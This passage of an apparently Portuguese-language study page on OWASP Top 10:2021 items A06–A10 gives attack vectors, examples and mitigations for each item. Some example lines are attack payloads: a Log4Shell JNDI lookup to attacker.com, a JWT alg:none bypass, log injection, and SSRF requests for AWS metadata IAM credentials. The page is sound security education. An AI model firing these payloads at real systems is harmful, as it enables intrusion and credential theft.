+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Infrastructure as Code (IaC) com hardening automatizado (CIS Benchmarks)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Desabilitar features, serviços e endpoints não utilizados em produção</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Headers HTTP de segurança: HSTS, CSP, X-Frame-Options, X-Content-Type-Options</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Desabilitar parsing de XML external entities nos parsers XML</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Rotação de credenciais padrão; remover contas de demo/test em produção</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Ambientes isolados: dev/staging/prod com segredos e configs separados</p></td></tr></tbody></table></div>
+<h2 id="a06-componentes-vulneráveis-e-desatualizados" class="banner"><span class="code">A06</span> Componentes Vulneráveis e Desatualizados <span class="tag">RISCO  ALTO</span></h2>
+<p>Uso de bibliotecas, frameworks ou dependências com vulnerabilidades conhecidas (CVEs). Uma das formas mais fáceis de comprometer sistemas modernos.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #6 (era #9 em 2017)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-937, CWE-1035, CWE-1104</p></td></tr><tr><td><p><strong>Caso emblemático</strong></p></td><td><p>Log4Shell (CVE-2021-44228) — CVSS 10.0, impacto global massivo</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-6">Vetores de Ataque</h3>
+<ul><li>
+Exploração de Log4Shell: JNDI lookup via ${jndi:ldap://attacker.com/x}
+</li><li>
+Dependências transitivas vulneráveis não visíveis no manifest direto
+</li><li>
+CVEs em imagens Docker desatualizadas usadas em produção
+</li><li>
+Exploração de CMS desatualizados: WordPress plugins com RCE conhecido
+</li><li>
+Supply chain attack: pacote npm malicioso injetado em dependência popular
+</li></ul>
+<h3 id="exemplos-técnicos-6">Exemplos Técnicos</h3>
+<pre><code>pom.xml com Log4j 2.14.1 → vulnerável a JNDI injection (Log4Shell)
+npm audit: 47 vulnerabilities (3 critical) — sem patch aplicado</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Software Composition Analysis (SCA): Snyk, OWASP Dependency-Check, Dependabot</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>SBOM (Software Bill of Materials) para rastrear todas as dependências</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Patch policy: janela máxima para aplicar CVEs críticos (ex: 48h para Critical)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Pinning de versões de dependências + assinatura de artefatos (checksums)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Imagens base mínimas (distroless, scratch) para reduzir superfície de ataque</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Scan automático de containers (Trivy, Grype) no pipeline CI/CD</p></td></tr></tbody></table></div>
+<h2 id="a07-falhas-de-identificação-e-autenticação" class="banner"><span class="code">A07</span> Falhas de Identificação e Autenticação <span class="tag">RISCO  ALTO</span></h2>
+<p>Confirmar identidade do usuário, autenticação e gerenciamento de sessão são críticos. Falhas permitem ataques de credential stuffing, brute force e session hijacking.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #7 (era #2 em 2017)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-255, CWE-259, CWE-287, CWE-288, CWE-290, CWE-294, CWE-295, CWE-330</p></td></tr><tr><td><p><strong>Técnicas comuns</strong></p></td><td><p>Credential Stuffing, Brute Force, Session Fixation, JWT manipulation</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-7">Vetores de Ataque</h3>
+<ul><li>
+Credential stuffing: uso de listas de credenciais vazadas (HaveIBeenPwned)
+</li><li>
+Brute force sem lockout: tentativas ilimitadas de senha
+</li><li>
+Session fixation: atacante define session ID antes do login
+</li><li>
+JWT com algoritmo 'none': header alg:none para bypassar verificação de assinatura
+</li><li>
+JWT com chave fraca: HS256 com segredo 'secret' quebrado por brute force
+</li><li>
+Cookie de sessão sem flag HttpOnly/Secure — roubável via XSS
+</li></ul>
+<h3 id="exemplos-técnicos-7">Exemplos Técnicos</h3>
+<pre><code>JWT: {alg:'none'} — servidor aceita token sem verificar assinatura
+Session ID previsível: JSESSIONID=0001, 0002, 0003 → fixation/prediction</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>MFA obrigatório para contas privilegiadas; recomendado para todos os usuários</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Rate limiting e CAPTCHA em endpoints de login; lockout progressivo</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Não expor enumeração de usuários (mesma mensagem para user inválido e senha errada)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Session IDs: gerados com CSPRNG; invalidados no logout; rotacionados pós-login</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Verificar algoritmo JWT explicitamente no servidor; rejeitar alg:none</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Implementar detecção de credential stuffing (IP reputation, device fingerprint)</p></td></tr></tbody></table></div>
+<h2 id="a08-falhas-de-integridade-de-software-e-dados" class="banner"><span class="code">A08</span> Falhas de Integridade de Software e Dados <span class="tag">RISCO  ALTO</span></h2>
+<p>Código e infraestrutura sem verificação de integridade. Inclui insecure deserialization e falhas na cadeia de suprimentos de software (CI/CD pipelines).</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #8 (nova categoria unificada; incorpora insecure deserialization)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-345, CWE-353, CWE-426, CWE-494, CWE-502, CWE-565, CWE-784, CWE-829</p></td></tr><tr><td><p><strong>Caso real</strong></p></td><td><p>SolarWinds: update malicioso distribuído via pipeline comprometido</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-8">Vetores de Ataque</h3>
+<ul><li>
+Deserialization de objetos Java/PHP/Python sem validação: gadget chains para RCE
+</li><li>
+Auto-update de app sem verificar assinatura do artefato
+</li><li>
+Pipeline CI/CD com secrets em variáveis de ambiente sem proteção
+</li><li>
+Dependência de CDN externo sem Subresource Integrity (SRI)
+</li><li>
+npm install de pacote typosquatted (event-stream, ua-parser-js comprometidos)
+</li></ul>
+<h3 id="exemplos-técnicos-8">Exemplos Técnicos</h3>
+<pre><code>Java: ObjectInputStream.readObject() sem whitelist de classes → RCE via gadget chain
+&lt;script src='https://cdn.example.com/lib.js'&gt; sem integrity hash</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Verificar assinaturas digitais de artefatos, pacotes e updates (Sigstore, cosign)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Não deserializar objetos de fontes não confiáveis; usar JSON em vez de serialização nativa</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Subresource Integrity (SRI) em todos os recursos externos de CDN</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Proteger pipeline CI/CD: least privilege, secrets em vault, scan de pipeline (SAST)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Revisar dependências de supply chain; usar lock files e verificar checksums</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>SLSA (Supply-chain Levels for Software Artifacts) framework para provenance</p></td></tr></tbody></table></div>
+<h2 id="a09-falhas-de-registro-e-monitoramento" class="banner"><span class="code">A09</span> Falhas de Registro e Monitoramento <span class="tag">RISCO  MÉDIO</span></h2>
+<p>Sem logging adequado e monitoramento, ataques não são detectados. Média de 287 dias para detecção de breach. Dificulta resposta a incidentes e forense.</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #9 (era #10 em 2017)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-117, CWE-223, CWE-532, CWE-778</p></td></tr><tr><td><p><strong>Impacto</strong></p></td><td><p>Sem logs: sem detecção, sem evidências forenses, sem compliance (LGPD, PCI-DSS)</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-9">Vetores de Ataque</h3>
+<ul><li>
+Atacante efetua 10.000 tentativas de login sem alertas sendo disparados
+</li><li>
+Log injection: inserir newlines em logs para forjar entradas (\n200 OK Admin login)
+</li><li>
+Sensibilização de logs: inundar com eventos falsos para esconder atividade maliciosa
+</li><li>
+Exfiltração de dados em múltiplos requests pequenos abaixo de thresholds de alerta
+</li><li>
+Logs armazenados localmente: atacante apaga evidências pós-comprometimento
+</li></ul>
+<h3 id="exemplos-técnicos-9">Exemplos Técnicos</h3>
+<pre><code>Nenhum log para: falhas de autenticação, erros de controle de acesso, erros 4xx/5xx
+Logs contendo senhas ou tokens em texto plano (via debug logging)</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Logar: autenticações (ok/fail), acessos negados, erros de validação, transações críticas</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Centralizar logs em SIEM (Splunk, ELK, Azure Sentinel) fora do servidor comprometível</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Alertas em tempo real: N falhas de login em X segundos, acesso a paths sensíveis</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Nunca logar dados sensíveis: senhas, PAN, tokens, PII (sanitizar antes de logar)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Log format estruturado (JSON) com campos padrão: timestamp, user, IP, action, result</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Garantir integridade dos logs: write-once storage, checksums, retenção por compliance</p></td></tr></tbody></table></div>
+<h2 id="a10-server-side-request-forgery-ssrf" class="banner"><span class="code">A10</span> Server-Side Request Forgery (SSRF) <span class="tag">RISCO  CRÍTICO</span></h2>
+<p>Forçar o servidor a fazer requests para destinos internos ou externos controlados pelo atacante. Critico em ambientes cloud com metadata services (AWS IMDS, GCP metadata).</p>
+<div class="tbl-wrap"><table><tbody><tr><td><p><strong>Versão OWASP</strong></p></td><td><p>2021 — #10 (nova entrada — adicionada por survey da comunidade)</p></td></tr><tr><td><p><strong>CWEs mapeadas</strong></p></td><td><p>CWE-918</p></td></tr><tr><td><p><strong>Ambiente de risco</strong></p></td><td><p>Cloud-native apps, microservices, webhooks, URL fetchers, PDF generators</p></td></tr></tbody></table></div>
+<h3 id="vetores-de-ataque-10">Vetores de Ataque</h3>
+<ul><li>
+http://169.254.169.254/latest/meta-data/ → roubo de credenciais IAM na AWS
+</li><li>
+SSRF para escanear rede interna: http://192.168.1.1, http://10.0.0.1/admin
+</li><li>
+Bypass de firewall: servidor faz request que firewall externo bloquearia do cliente
+</li><li>
+SSRF via redirect: servidor segue redirecionamentos para destino interno
+</li><li>
+Blind SSRF: sem response visível, mas interação confirmada via OOB (DNS/HTTP callback)
+</li><li>
+SSRF em parsers PDF/HTML que fazem fetch de recursos externos
+</li></ul>
+<h3 id="exemplos-técnicos-10">Exemplos Técnicos</h3>
+<pre><code>POST /api/fetch-url {url:'http://169.254.169.254/latest/meta-data/iam/security-credentials/'}
+Webhook com URL controlada pelo atacante apontando para http://internal-api/admin</code></pre>
+<div class="tbl-wrap"><table><thead><tr><th colspan=2><strong>Mitigações Principais</strong></th></tr></thead><tbody><tr><td><p><strong>✓</strong></p></td><td><p>Whitelist de destinos permitidos (domínios/IPs) — nunca blacklist</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Bloquear ranges de IP privados: 10.x, 172.16-31.x, 192.168.x, 169.254.x (link-local)</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>IMDSv2 na AWS: requer token em dois passos — mitiga SSRF clássico</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Não redirecionar responses de URLs externas diretamente ao cliente</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Firewall egress no servidor de aplicação: só permite destinos explicitamente necessários</p></td></tr><tr><td><p><strong>✓</strong></p></td><td><p>Usar DNS pinning e validar IP APÓS resolução DNS (prevenir DNS rebinding)</p></td></tr></tbody></table></div>
+<p><em>Referências: owasp.org/Top10 — OWASP Top 10:2021 | CWE MITRE | NVD NIST</em></p>
+  </article>
+</main>
+</div>
+<a class="fab" href="../../index.html" aria-label="Voltar ao hub">◂ HUB</a>
+<button class="totop" type="button" aria-label="Voltar ao topo">▲</button>
+<script>
+(function(){
+  var $=function(s,r){return (r||document).querySelector(s)}, $$=function(s,r){return Array.prototype.slice.call((r||document).querySelectorAll(s))};
+  /* tema */
+  var TK='hub-theme', modes=['auto','light','dark'];
+  function applyTheme(m){ if(m==='auto') document.documentElement.removeAttribute('data-theme'); else document.documentElement.setAttribute('data-theme',m); var b=$('#theme'); if(b) b.textContent='tema: '+m; }
+  var tm='auto'; try{tm=localStorage.getItem(TK)||'auto'}catch(e){}
+  applyTheme(tm);
+  $('#theme').addEventListener('click',function(){ tm=modes[(modes.indexOf(tm)+1)%3]; try{localStorage.setItem(TK,tm)}catch(e){} applyTheme(tm); });
+  /* menu mobile */
+  var side=$('aside'), scrim=$('.scrim');
+  function menu(o){ side.classList.toggle('open',o); scrim.classList.toggle('open',o); }
+  $('#menu').addEventListener('click',function(){menu(true)}); scrim.addEventListener('click',function(){menu(false)});
+  $$('nav.toc a').forEach(function(a){a.addEventListener('click',function(){menu(false)})});
+  /* filtro do sumário */
+  $('#filter').addEventListener('input',function(e){ var q=e.target.value.trim().toLowerCase(); $$('nav.toc a').forEach(function(a){ a.hidden = q && a.textContent.toLowerCase().indexOf(q)<0; }); });
+  document.addEventListener('keydown',function(e){ if(e.key==='/' && document.activeElement.tagName!=='INPUT'){ e.preventDefault(); if(innerWidth<=980) menu(true); $('#filter').focus(); } });
+  /* progresso + topo */
+  var bar=$('#progress'), top=$('.totop');
+  function onScroll(){ var h=document.documentElement; var p=h.scrollTop/(h.scrollHeight-h.clientHeight||1); bar.style.width=(p*100)+'%'; top.classList.toggle('show',h.scrollTop>900); }
+  addEventListener('scroll',onScroll,{passive:true}); onScroll();
+  top.addEventListener('click',function(){scrollTo({top:0,behavior:'smooth'})});
+  /* scroll spy */
+  var links=$$('nav.toc a'), map={}; links.forEach(function(a){ map[a.getAttribute('href').slice(1)]=a; });
+  if('IntersectionObserver' in window){
+    var io=new IntersectionObserver(function(es){ es.forEach(function(en){ if(en.isIntersecting){ links.forEach(function(l){l.classList.remove('on')}); var a=map[en.target.id]; if(a){ a.classList.add('on'); a.scrollIntoView({block:'nearest'}); } } }); },{rootMargin:'-10% 0px -80% 0px'});
+    Object.keys(map).forEach(function(id){ var el=document.getElementById(id); if(el) io.observe(el); });
+  }
+  /* tabelas largas */
+  $$('.tbl-wrap table').forEach(function(t){ var n=t.rows[0]?t.rows[0].cells.length:0; if(n>=5) t.classList.add('wide'); });
+  /* autoavaliação */
+  var tables=$$('table.assess'); if(!tables.length) return;
+  var KEY='hub-assess:'+document.body.dataset.doc, st={};
+  try{ st=JSON.parse(localStorage.getItem(KEY)||'{}') }catch(e){}
+  var OPTS=[['d','Domino','k-d'],['r','Reviso','k-r'],['e','Estudo','k-e']];
+  var cells=[];
+  tables.forEach(function(t,ti){
+    var heads=$$('thead th',t).map(function(th){return th.textContent.trim()});
+    $$('tbody tr',t).forEach(function(tr,ri){
+      $$('td',tr).forEach(function(td,ci){ if(heads[ci]) td.setAttribute('data-l',heads[ci]); });
+      var td=$('td.mark',tr); if(!td) return;
+      var id=ti+'-'+ri; cells.push(id);
+      td.innerHTML='<span class="mk" role="group" aria-label="Autoavaliação">'+OPTS.map(function(o){return '<button type="button" class="'+o[2]+'" data-id="'+id+'" data-v="'+o[0]+'" aria-pressed="'+(st[id]===o[0])+'">'+o[1]+'</button>'}).join('')+'</span>';
+    });
+  });
+  var barEl=document.createElement('div'); barEl.className='assess-bar';
+  var anchor=$('.doc h2'); anchor.parentNode.insertBefore(barEl,anchor);
+  function render(){
+    var c={d:0,r:0,e:0}; cells.forEach(function(id){ if(st[id]) c[st[id]]++; });
+    var n=cells.length, done=c.d+c.r+c.e, w=function(v){return (v/n*100).toFixed(2)+'%'};
+    barEl.innerHTML='<span>Autoavaliação · '+done+'/'+n+'</span><span class="meter"><i style="width:'+w(c.d)+';background:var(--tip)"></i><i style="width:'+w(c.r)+';background:var(--warn)"></i><i style="width:'+w(c.e)+';background:#E5484D"></i></span><span class="k-d"><b>'+c.d+'</b> domino</span><span class="k-r"><b>'+c.r+'</b> reviso</span><span class="k-e"><b>'+c.e+'</b> estudo</span><button class="theme" type="button" id="aclear">limpar</button>';
+  }
+  render();
+  document.addEventListener('click',function(e){
+    var b=e.target.closest('.mk button');
+    if(b){ var id=b.dataset.id, v=b.dataset.v; st[id]=st[id]===v?undefined:v; if(!st[id]) delete st[id];
+      try{localStorage.setItem(KEY,JSON.stringify(st))}catch(_){}
+      $$('button[data-id="'+id+'"]').forEach(function(x){x.setAttribute('aria-pressed',String(x.dataset.v===st[id]))}); render(); return; }
+    if(e.target.id==='aclear'){ if(e.target.dataset.confirm){ st={}; try{localStorage.removeItem(KEY)}catch(_){} $$('.mk button').forEach(function(x){x.setAttribute('aria-pressed','false')}); render(); } else { e.target.dataset.confirm='1'; e.target.textContent='confirmar?'; } }
+  });
+})();
+</script>
+</body>
+</html>
